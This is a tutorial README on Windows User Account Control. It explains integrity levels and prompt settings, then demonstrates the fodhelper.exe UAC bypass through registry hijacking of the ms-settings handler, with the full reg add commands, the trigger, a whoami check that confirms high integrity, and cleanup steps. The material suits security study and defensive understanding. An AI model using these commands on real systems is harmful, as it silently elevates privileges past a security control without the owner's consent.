<img width="1294" height="1052" alt="image" src="https://github.com/user-attachments/assets/20f02f0d-6bd6-4473-830a-72069cdc3279" /><h1 align="center"> Windows UAC Bypass </h1>



---

## Scope




---


## Table of Contents






---



# INTRODUCTION TO WINDOWS UAC BYPASS

## UAC Bypass:

### What is UAC (User Account Control)?
- **UAC (User Account Control)** is Windows' security feature that prevents unauthorized changes to the operating system. When you try to perform administrative tasks, UAC prompts for confirmation or administrator credentials.

- **Simple Analogy**: Think of UAC as a bouncer at a VIP club. Even if you're on the guest list (administrator account), the bouncer still checks your ID before letting you in.

- **UAC** limits when apps can run with elevated (`administrator`) privileges. By default, processes start with standard rights (medium integrity), even if you’re logged in as an administrator. When an app needs higher integrity (e.g., to write to system locations), Windows shows a prompt asking you to confirm or provide credentials. This reduces the risk of silent elevation by malware and forces explicit consent.



### What is UAC Bypass?




## Integrity levels and elevation flow

- **Default integrity**: Most apps start at medium integrity—enough for user tasks, not system changes.
- **Elevation request**: When an app needs admin rights, it triggers a UAC prompt.
- **Consent vs credentials**: Admin accounts typically see a consent prompt; standard users must enter admin credentials.
- **Isolation**: Prompts can appear on the secure desktop, isolating them from other apps to prevent tampering.

### UAC prompt levels explained

- **Level 0 (No prompt)**:
  - **Effect**: Elevation happens silently.
  - **Risk**: High—malware can gain admin rights without user interaction.
- **Level 1 (Prompt for credentials on secure desktop)**:  
  - **Effect**: Requires admin username/password; appears on secure desktop.
  - **Use case**: Strict environments; standard users must authenticate.
- **Level 2 (Prompt for consent on secure desktop)**:  
  - **Effect**: Admins click “Yes/No”; appears on secure desktop.
  - **Use case**: Balanced security—isolated prompt, minimal friction.
- **Level 3 (Prompt for credentials on normal desktop)**:  
  - **Effect**: Requires admin credentials; not isolated.
  - **Risk**: Other apps could potentially interact with the prompt.
- **Level 4 (Prompt for consent on normal desktop)**:  
  - **Effect**: Admins click “Yes/No”; not isolated.
  - **Risk**: Lower than Level 0, but weaker than secure desktop.
- **Level 5 — Prompt for consent for non‑Windows binaries**:  
  - **Effect**: Consent prompts only for non‑Microsoft executables; Windows-signed binaries may auto-elevate.
  - **Use case**: Convenience-focused; trust in Microsoft-signed code.


### Secure desktop vs normal desktop

#### Secure Desktop:
- **Isolation**: UAC prompt runs in a separate, protected desktop session.
- **Protection**: Blocks other processes from sending clicks/keys or overlaying UI.
- **Visual cue**: Screen dims; only the UAC dialog is interactive.

#### Normal Desktop:
- **Integration**: Prompt appears like any other window.
- **Risk**: UI spoofing or input injection is more plausible.



## Understanding UAC 

### UAC Levels 
- Always notify (Most secure)
- Notify me only when apps try to make changes (Default)
- Notify me only when apps try to make changes (do not dim desktop)
- Never notify (Least secure - Disables UAC)


### UAC Internals - How It Works
````
User Application (Medium Integrity) → Request Admin → UAC Prompt → 
If Approved → COM Elevation Moniker → Admin Process (High Integrity)
````




## Mandatory Integrity Control (MIC)
**MIC** enforces access control based on integrity levels, not just user permissions. It’s designed to prevent lower-trust processes from tampering with higher-trust ones — even if they belong to the same user.
- Think of it as a vertical barrier:
  - **A low-integrity** process can’t write to a medium-integrity file.
  - **A medium-integrity** app can’t inject into a high-integrity service.
- This protects sensitive system components from being modified by less trusted software.


### Key Components:
- **Consent.exe** - Shows the UAC prompt
- **AppInfo.dll** - Handles elevation requests
- **mshta.exe**, **wscript.exe** - Often used in bypasses
- **AutoElevation** - Some Microsoft binaries auto-elevate
- **Integrity Levels**:
  - **Low** (Internet Explorer)
  - **Medium** (Standard user apps) 
  - **High** (Admin apps)
  - **System** (Kernel)


### Here are the four standard integrity Levels used in MIC:

| Integrity Level | Typical Use Case                                       | Access Restrictions                                        |
| --------------- | ------------------------------------------------------ | ---------------------------------------------------------- |
| Low             | Web browsers in protected mode, sandboxed applications | Cannot write to medium, high, or system-level objects      |
| Medium          | Standard user applications (Explorer, Notepad, etc.)   | Can write to medium-level objects, but not high or system  |
| High            | Elevated applications (Run as Administrator)           | Can write to medium and high-level objects, but not system |
| System          | Core OS processes (LSASS, Winlogon, etc.)              | Highest level; only system-level processes can interact    |







## How to view and change UAC settings (GUI)

### Open UAC settings:  
- Action: Press `Ctrl + S` → type `UAC` → select `Change User Account Control settings`:
<img width="779" height="680" alt="image" src="https://github.com/user-attachments/assets/8939dadd-fd54-4566-9e73-2621d7e1482e" />



### **Understand the slider**:  
Action: The slider maps to common policies (not exactly the numeric levels above).
- Always notify: Closest to secure desktop consent for all changes.
- Default: Notify when apps try to make changes (secure desktop on by default).
- Notify without dimming: Normal desktop prompts.
- Never notify: Equivalent to Level 0 behavior.

<img width="744" height="552" alt="image" src="https://github.com/user-attachments/assets/9cac74e7-fca8-4915-91fd-7f161822a5b5" />

- Choose your level:  
  - **Recommendation**: Keep secure desktop enabled (screen dims) and avoid `Never notify`.
- Apply and test:  
  - **Action**: Click `OK`, then run an app that requires elevation (e.g., an installer) to confirm behavior.




## Relationship Between UAC & MIC

- **MIC** = The rules and vault doors (who can go where)
- **UAC** = The security guard who asks “Are you sure?” before letting you into the vault


### To Recap
| Term                              | Role                                                        | Analogy                                  |
| --------------------------------- | ----------------------------------------------------------- | ---------------------------------------- |
| MIC (Mandatory Integrity Control) | Enforces boundaries based on trust/integrity levels         | The bank’s vault rules                   |
| UAC (User Account Control)        | Requests user approval before crossing integrity boundaries | A security guard asking, “Are you sure?” |


### Visua Summery
````
[Standard App] → Tries to do something risky
         ↓
     [UAC Prompt] → "Do you allow this?"
         ↓ (if YES)
[App gets Elevated] → Now runs at HIGH INTEGRITY
         ↓
     [MIC allows it] → Because now it has the right "trust level"
````








---




# WINDOWS UAC BYPASS METHODOLOGY


## 1. Enumerate UAC Configuration

### IS UAC Enabled?
#### Check on PowerShell:
````
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
````
<img width="1512" height="138" alt="image" src="https://github.com/user-attachments/assets/a1492500-c086-4834-9bd7-7aad4ecab964" />


#### CMD
````
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
````
<img width="863" height="96" alt="image" src="https://github.com/user-attachments/assets/6c660fdc-d95e-4a00-8f4e-8771a1e98d2e" />

Now we see:
````
EnableLUA    REG_DWORD    0x1
````
- `1` = UAC is **ENABLED**
- `0` = UAC is **DISABLED**











## 2. Basic UAC Bypass Techniques

### Basic FodHelper Bypass
``FodHelper.exe`` is a Windows feature that manages optional features. It has a registry vulnerability that allows privilege escalation.



#### Check if we're in Administrators group
````
net localgroup administrators
````
<img width="1065" height="262" alt="image" src="https://github.com/user-attachments/assets/9c0c7678-d29e-4634-8bf3-05e33d322233" />


#### Create registry entries
````
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe" /f
````
<img width="880" height="107" alt="image" src="https://github.com/user-attachments/assets/e2967a5c-a80c-41fe-865e-ff0c7e31a600" />

- Using reg query:
````
reg query "HKCU\Software\Classes\ms-settings\shell\open\command" /ve
````
<img width="916" height="177" alt="image" src="https://github.com/user-attachments/assets/04ae1428-df45-47cf-92cc-b47c28d13194" />

- Now we see our file.

- Start hijack:
````
start fodhelper.exe
````
<img width="354" height="105" alt="image" src="https://github.com/user-attachments/assets/45dcb1b9-c0b4-4d71-a1b4-acff616cfbc6" />


- After we use this command , it will show this:
<img width="1914" height="901" alt="image" src="https://github.com/user-attachments/assets/0d5caef7-e9f3-4797-b013-b2743b189a61" />




#### Set the default value (payload):  
````
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe" /f
reg query "HKCU\Software\Classes\ms-settings\shell\open\command" /ve
reg query "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute
````
<img width="947" height="457" alt="image" src="https://github.com/user-attachments/assets/be560d35-91ad-4c38-a2fb-269001a2c788" />


##### Trigger the hijack
````
start fodhelper.exe
````
After we ran this command we will see one more `Terminal` show:
<img width="986" height="643" alt="image" src="https://github.com/user-attachments/assets/12c2bc16-2e9d-4a06-b151-7730112fb83d" />

- `fodhelper.exe` is a trusted auto‑elevated binary.
- It calls `ms-settings`.
- Because of your registry hijack, it should launch `cmd.exe` without showing a **UAC prompt**.


##### Verify elevation
````
whoami /groups | findstr Mandatory
````
<img width="1297" height="477" alt="image" src="https://github.com/user-attachments/assets/a7be7cee-b6c4-4803-be67-3e666d4a493c" />

Now we see:
````
Mandatory Label\High Mandatory Level   Label   S-1-16-12288
````
- **Mandatory Label** is the integrity level assigned to the process.
- **High Mandatory Level** means the process is running with elevated privileges (administrator rights).
- This shows that your hijack worked: when you launched `fodhelper.exe`, it spawned `cmd.exe` in a **high-integrity context without a UAC prompt**.


##### Clean up afterward
````
reg delete "HKCU\Software\Classes\ms-settings" /f
````
- Or
````
reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f
````
<img width="566" height="110" alt="image" src="https://github.com/user-attachments/assets/9ff34425-ca93-425e-b4fa-f86d1977bd0c" />

- Now we got success.


### Explanation:
- FodHelper tries to open `ms-settings`:
- It checks registry for handler
- Finds our malicious command
- Executes it with high integrity



---

















